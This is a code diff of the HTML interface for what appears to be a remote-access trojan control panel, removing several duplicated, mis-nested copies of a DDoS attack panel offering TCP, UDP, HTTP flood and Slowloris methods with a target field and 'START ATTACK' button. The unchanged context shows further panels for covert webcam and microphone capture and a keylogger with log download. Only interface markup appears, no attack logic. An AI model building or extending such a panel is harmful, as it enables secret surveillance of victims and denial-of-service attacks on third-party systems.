@@ -192,83 +192,8 @@
         <input type="text" id="login-username" placeholder="Username" autocomplete="off">
         <input type="password" id="login-password" placeholder="Password">
         <button id="login-btn" onclick="doLogin()">Sign In</button>
-        <div class="error-msg" id="login-error">    </div>
-
-    <!-- DDOS -->
-    <div id="ddos-panel" class="panel">
-        <div style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:16px;">
-            <!-- Configuration -->
-            <div class="stat-card">
-                <div class="stat-title">🎯 Target Configuration</div>
-                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Target IP / Host</label>
-                        <input id="ddos-target" placeholder="192.168.1.1 or example.com" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Port</label>
-                        <input id="ddos-port" type="number" value="80" min="1" max="65535" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                </div>
-
-                <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Threads</label>
-                        <input id="ddos-threads" type="number" value="50" min="1" max="500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Packet Size (bytes)</label>
-                        <input id="ddos-pkt-size" type="number" value="1024" min="64" max="65500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Method</label>
-                        <select id="ddos-method" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;">
-                            <option value="tcp">TCP Flood</option>
-                            <option value="udp">UDP Flood</option>
-                            <option value="http">HTTP Flood</option>
-                            <option value="slowloris">Slowloris</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div style="display:flex;gap:8px;margin-top:12px;align-items:flex-end;">
-                    <button id="ddos-toggle-btn" class="btn-danger-lg" onclick="toggleDdos()" style="flex:1;">
-                        🔥 START ATTACK
-                    </button>
-                </div>
-            </div>
-
-            <!-- Stats Cards -->
-            <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:12px;">
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📤 Packets Sent</div>
-                    <div class="stat-value" id="ddos-packets" style="color:var(--accent-orange);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⚡ Packets/sec</div>
-                    <div class="stat-value" id="ddos-pps" style="color:var(--accent-cyan);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📊 Total Data</div>
-                    <div class="stat-value" id="ddos-data" style="color:var(--accent-purple);">0 MB</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⏱️ Duration</div>
-                    <div class="stat-value" id="ddos-duration" style="color:var(--text-primary);">00:00</div>
-                </div>
-            </div>
-
-            <!-- Log -->
-            <div class="stat-card" style="flex:1;display:flex;flex-direction:column;min-height:0;">
-                <div class="stat-title">📋 Attack Log</div>
-                <div id="ddos-log" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:12px;line-height:1.6;color:var(--accent-green);background:#0a0a0a;padding:10px;border-radius:var(--radius-sm);min-height:0;">
-                    <div style="color:var(--text-muted);text-align:center;padding:20px;">Configure target and start attack</div>
-                </div>
-            </div>
-        </div>
+        <div class="error-msg" id="login-error"></div>
     </div>
-
-</div>
 </div>
 
 <!-- TOPBAR -->
@@ -325,163 +250,13 @@
         <div class="sidebar-section-title">Dashboard</div>
         <div class="nav-item" data-panel="stats-panel" onclick="switchPanel('stats-panel', this)">
             <span class="nav-icon">📊</span><span class="nav-label">System Monitor</span>
-            </div>
-
-    <!-- DDOS -->
-    <div id="ddos-panel" class="panel">
-        <div style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:16px;">
-            <!-- Configuration -->
-            <div class="stat-card">
-                <div class="stat-title">🎯 Target Configuration</div>
-                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Target IP / Host</label>
-                        <input id="ddos-target" placeholder="192.168.1.1 or example.com" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Port</label>
-                        <input id="ddos-port" type="number" value="80" min="1" max="65535" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                </div>
-
-                <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Threads</label>
-                        <input id="ddos-threads" type="number" value="50" min="1" max="500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Packet Size (bytes)</label>
-                        <input id="ddos-pkt-size" type="number" value="1024" min="64" max="65500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Method</label>
-                        <select id="ddos-method" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;">
-                            <option value="tcp">TCP Flood</option>
-                            <option value="udp">UDP Flood</option>
-                            <option value="http">HTTP Flood</option>
-                            <option value="slowloris">Slowloris</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div style="display:flex;gap:8px;margin-top:12px;align-items:flex-end;">
-                    <button id="ddos-toggle-btn" class="btn-danger-lg" onclick="toggleDdos()" style="flex:1;">
-                        🔥 START ATTACK
-                    </button>
-                </div>
-            </div>
-
-            <!-- Stats Cards -->
-            <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:12px;">
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📤 Packets Sent</div>
-                    <div class="stat-value" id="ddos-packets" style="color:var(--accent-orange);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⚡ Packets/sec</div>
-                    <div class="stat-value" id="ddos-pps" style="color:var(--accent-cyan);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📊 Total Data</div>
-                    <div class="stat-value" id="ddos-data" style="color:var(--accent-purple);">0 MB</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⏱️ Duration</div>
-                    <div class="stat-value" id="ddos-duration" style="color:var(--text-primary);">00:00</div>
-                </div>
-            </div>
-
-            <!-- Log -->
-            <div class="stat-card" style="flex:1;display:flex;flex-direction:column;min-height:0;">
-                <div class="stat-title">📋 Attack Log</div>
-                <div id="ddos-log" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:12px;line-height:1.6;color:var(--accent-green);background:#0a0a0a;padding:10px;border-radius:var(--radius-sm);min-height:0;">
-                    <div style="color:var(--text-muted);text-align:center;padding:20px;">Configure target and start attack</div>
-                </div>
-            </div>
         </div>
     </div>
-
-</div>
     <div class="sidebar-footer">
         <div class="nav-item" onclick="toggleSidebar()">
             <span class="nav-icon">◀</span><span class="nav-label">Collapse</span>
-            </div>
-
-    <!-- DDOS -->
-    <div id="ddos-panel" class="panel">
-        <div style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:16px;">
-            <!-- Configuration -->
-            <div class="stat-card">
-                <div class="stat-title">🎯 Target Configuration</div>
-                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Target IP / Host</label>
-                        <input id="ddos-target" placeholder="192.168.1.1 or example.com" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Port</label>
-                        <input id="ddos-port" type="number" value="80" min="1" max="65535" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                </div>
-
-                <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Threads</label>
-                        <input id="ddos-threads" type="number" value="50" min="1" max="500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Packet Size (bytes)</label>
-                        <input id="ddos-pkt-size" type="number" value="1024" min="64" max="65500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Method</label>
-                        <select id="ddos-method" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;">
-                            <option value="tcp">TCP Flood</option>
-                            <option value="udp">UDP Flood</option>
-                            <option value="http">HTTP Flood</option>
-                            <option value="slowloris">Slowloris</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div style="display:flex;gap:8px;margin-top:12px;align-items:flex-end;">
-                    <button id="ddos-toggle-btn" class="btn-danger-lg" onclick="toggleDdos()" style="flex:1;">
-                        🔥 START ATTACK
-                    </button>
-                </div>
-            </div>
-
-            <!-- Stats Cards -->
-            <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:12px;">
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📤 Packets Sent</div>
-                    <div class="stat-value" id="ddos-packets" style="color:var(--accent-orange);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⚡ Packets/sec</div>
-                    <div class="stat-value" id="ddos-pps" style="color:var(--accent-cyan);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📊 Total Data</div>
-                    <div class="stat-value" id="ddos-data" style="color:var(--accent-purple);">0 MB</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⏱️ Duration</div>
-                    <div class="stat-value" id="ddos-duration" style="color:var(--text-primary);">00:00</div>
-                </div>
-            </div>
-
-            <!-- Log -->
-            <div class="stat-card" style="flex:1;display:flex;flex-direction:column;min-height:0;">
-                <div class="stat-title">📋 Attack Log</div>
-                <div id="ddos-log" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:12px;line-height:1.6;color:var(--accent-green);background:#0a0a0a;padding:10px;border-radius:var(--radius-sm);min-height:0;">
-                    <div style="color:var(--text-muted);text-align:center;padding:20px;">Configure target and start attack</div>
-                </div>
-            </div>
         </div>
     </div>
-
-</div>
 </div>
 
 <!-- MAIN -->
@@ -519,83 +294,8 @@
                 <button class="btn-sm" onclick="sendShortcut('ctrl_c')">Ctrl+C</button>
                 <button class="btn-sm" onclick="sendShortcut('ctrl_v')">Ctrl+V</button>
             </span>
-            </div>
-
-    <!-- DDOS -->
-    <div id="ddos-panel" class="panel">
-        <div style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:16px;">
-            <!-- Configuration -->
-            <div class="stat-card">
-                <div class="stat-title">🎯 Target Configuration</div>
-                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Target IP / Host</label>
-                        <input id="ddos-target" placeholder="192.168.1.1 or example.com" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Port</label>
-                        <input id="ddos-port" type="number" value="80" min="1" max="65535" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                </div>
-
-                <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Threads</label>
-                        <input id="ddos-threads" type="number" value="50" min="1" max="500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Packet Size (bytes)</label>
-                        <input id="ddos-pkt-size" type="number" value="1024" min="64" max="65500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Method</label>
-                        <select id="ddos-method" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;">
-                            <option value="tcp">TCP Flood</option>
-                            <option value="udp">UDP Flood</option>
-                            <option value="http">HTTP Flood</option>
-                            <option value="slowloris">Slowloris</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div style="display:flex;gap:8px;margin-top:12px;align-items:flex-end;">
-                    <button id="ddos-toggle-btn" class="btn-danger-lg" onclick="toggleDdos()" style="flex:1;">
-                        🔥 START ATTACK
-                    </button>
-                </div>
-            </div>
-
-            <!-- Stats Cards -->
-            <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:12px;">
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📤 Packets Sent</div>
-                    <div class="stat-value" id="ddos-packets" style="color:var(--accent-orange);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⚡ Packets/sec</div>
-                    <div class="stat-value" id="ddos-pps" style="color:var(--accent-cyan);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📊 Total Data</div>
-                    <div class="stat-value" id="ddos-data" style="color:var(--accent-purple);">0 MB</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⏱️ Duration</div>
-                    <div class="stat-value" id="ddos-duration" style="color:var(--text-primary);">00:00</div>
-                </div>
-            </div>
-
-            <!-- Log -->
-            <div class="stat-card" style="flex:1;display:flex;flex-direction:column;min-height:0;">
-                <div class="stat-title">📋 Attack Log</div>
-                <div id="ddos-log" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:12px;line-height:1.6;color:var(--accent-green);background:#0a0a0a;padding:10px;border-radius:var(--radius-sm);min-height:0;">
-                    <div style="color:var(--text-muted);text-align:center;padding:20px;">Configure target and start attack</div>
-                </div>
-            </div>
         </div>
     </div>
-
-</div>
 
     <!-- WEB CAM -->
     <div id="webcam-panel" class="panel" style="background:#000;">
@@ -609,83 +309,8 @@
             <select id="webcam-quality" onchange="emitToClient('set_webcam_quality',{quality:parseInt(this.value)})">
                 <option value="30">Low</option><option value="55" selected>Medium</option><option value="85">High</option>
             </select>
-            </div>
-
-    <!-- DDOS -->
-    <div id="ddos-panel" class="panel">
-        <div style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:16px;">
-            <!-- Configuration -->
-            <div class="stat-card">
-                <div class="stat-title">🎯 Target Configuration</div>
-                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Target IP / Host</label>
-                        <input id="ddos-target" placeholder="192.168.1.1 or example.com" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Port</label>
-                        <input id="ddos-port" type="number" value="80" min="1" max="65535" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                </div>
-
-                <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Threads</label>
-                        <input id="ddos-threads" type="number" value="50" min="1" max="500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Packet Size (bytes)</label>
-                        <input id="ddos-pkt-size" type="number" value="1024" min="64" max="65500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Method</label>
-                        <select id="ddos-method" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;">
-                            <option value="tcp">TCP Flood</option>
-                            <option value="udp">UDP Flood</option>
-                            <option value="http">HTTP Flood</option>
-                            <option value="slowloris">Slowloris</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div style="display:flex;gap:8px;margin-top:12px;align-items:flex-end;">
-                    <button id="ddos-toggle-btn" class="btn-danger-lg" onclick="toggleDdos()" style="flex:1;">
-                        🔥 START ATTACK
-                    </button>
-                </div>
-            </div>
-
-            <!-- Stats Cards -->
-            <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:12px;">
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📤 Packets Sent</div>
-                    <div class="stat-value" id="ddos-packets" style="color:var(--accent-orange);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⚡ Packets/sec</div>
-                    <div class="stat-value" id="ddos-pps" style="color:var(--accent-cyan);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📊 Total Data</div>
-                    <div class="stat-value" id="ddos-data" style="color:var(--accent-purple);">0 MB</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⏱️ Duration</div>
-                    <div class="stat-value" id="ddos-duration" style="color:var(--text-primary);">00:00</div>
-                </div>
-            </div>
-
-            <!-- Log -->
-            <div class="stat-card" style="flex:1;display:flex;flex-direction:column;min-height:0;">
-                <div class="stat-title">📋 Attack Log</div>
-                <div id="ddos-log" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:12px;line-height:1.6;color:var(--accent-green);background:#0a0a0a;padding:10px;border-radius:var(--radius-sm);min-height:0;">
-                    <div style="color:var(--text-muted);text-align:center;padding:20px;">Configure target and start attack</div>
-                </div>
-            </div>
         </div>
     </div>
-
-</div>
 
     <!-- MICROPHONE -->
     <div id="mic-panel" class="panel">
@@ -700,83 +325,8 @@
         <div class="screen-controls">
             <button id="mic-toggle-btn" class="btn-sm" onclick="toggleMic()">▶ Start Mic</button>
             <span style="font-size:11px;color:var(--text-muted);" id="mic-status-text">Idle</span>
-            </div>
-
-    <!-- DDOS -->
-    <div id="ddos-panel" class="panel">
-        <div style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:16px;">
-            <!-- Configuration -->
-            <div class="stat-card">
-                <div class="stat-title">🎯 Target Configuration</div>
-                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Target IP / Host</label>
-                        <input id="ddos-target" placeholder="192.168.1.1 or example.com" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Port</label>
-                        <input id="ddos-port" type="number" value="80" min="1" max="65535" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                </div>
-
-                <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Threads</label>
-                        <input id="ddos-threads" type="number" value="50" min="1" max="500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Packet Size (bytes)</label>
-                        <input id="ddos-pkt-size" type="number" value="1024" min="64" max="65500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Method</label>
-                        <select id="ddos-method" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;">
-                            <option value="tcp">TCP Flood</option>
-                            <option value="udp">UDP Flood</option>
-                            <option value="http">HTTP Flood</option>
-                            <option value="slowloris">Slowloris</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div style="display:flex;gap:8px;margin-top:12px;align-items:flex-end;">
-                    <button id="ddos-toggle-btn" class="btn-danger-lg" onclick="toggleDdos()" style="flex:1;">
-                        🔥 START ATTACK
-                    </button>
-                </div>
-            </div>
-
-            <!-- Stats Cards -->
-            <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:12px;">
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📤 Packets Sent</div>
-                    <div class="stat-value" id="ddos-packets" style="color:var(--accent-orange);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⚡ Packets/sec</div>
-                    <div class="stat-value" id="ddos-pps" style="color:var(--accent-cyan);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📊 Total Data</div>
-                    <div class="stat-value" id="ddos-data" style="color:var(--accent-purple);">0 MB</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⏱️ Duration</div>
-                    <div class="stat-value" id="ddos-duration" style="color:var(--text-primary);">00:00</div>
-                </div>
-            </div>
-
-            <!-- Log -->
-            <div class="stat-card" style="flex:1;display:flex;flex-direction:column;min-height:0;">
-                <div class="stat-title">📋 Attack Log</div>
-                <div id="ddos-log" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:12px;line-height:1.6;color:var(--accent-green);background:#0a0a0a;padding:10px;border-radius:var(--radius-sm);min-height:0;">
-                    <div style="color:var(--text-muted);text-align:center;padding:20px;">Configure target and start attack</div>
-                </div>
-            </div>
         </div>
     </div>
-
-</div>
 
     <!-- KEYLOGGER -->
     <div id="keylog-panel" class="panel">
@@ -788,83 +338,8 @@
             <button class="btn-sm" onclick="clearKeylog()">🗑 Clear</button>
             <button class="btn-sm" onclick="downloadKeylog()">💾 Download</button>
             <span style="font-size:11px;color:var(--text-muted);" id="keylog-status-text">Stopped</span>
-            </div>
-
-    <!-- DDOS -->
-    <div id="ddos-panel" class="panel">
-        <div style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:16px;">
-            <!-- Configuration -->
-            <div class="stat-card">
-                <div class="stat-title">🎯 Target Configuration</div>
-                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Target IP / Host</label>
-                        <input id="ddos-target" placeholder="192.168.1.1 or example.com" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Port</label>
-                        <input id="ddos-port" type="number" value="80" min="1" max="65535" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                </div>
-
-                <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:12px;">
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Threads</label>
-                        <input id="ddos-threads" type="number" value="50" min="1" max="500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Packet Size (bytes)</label>
-                        <input id="ddos-pkt-size" type="number" value="1024" min="64" max="65500" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;transition:var(--transition);">
-                    </div>
-                    <div>
-                        <label style="font-size:11px;color:var(--text-muted);display:block;margin-bottom:4px;">Method</label>
-                        <select id="ddos-method" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;">
-                            <option value="tcp">TCP Flood</option>
-                            <option value="udp">UDP Flood</option>
-                            <option value="http">HTTP Flood</option>
-                            <option value="slowloris">Slowloris</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div style="display:flex;gap:8px;margin-top:12px;align-items:flex-end;">
-                    <button id="ddos-toggle-btn" class="btn-danger-lg" onclick="toggleDdos()" style="flex:1;">
-                        🔥 START ATTACK
-                    </button>
-                </div>
-            </div>
-
-            <!-- Stats Cards -->
-            <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:12px;">
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">📤 Packets Sent</div>
-                    <div class="stat-value" id="ddos-packets" style="color:var(--accent-orange);">0</div>
-                </div>
-                <div class="stat-card ddos-stat-card">
-                    <div class="stat-title">⚡ Packets/sec</div>
-                    <div class="stat-value" id="ddos-pps" style="color:var(--accent-cyan);">0</div>
-                </div>
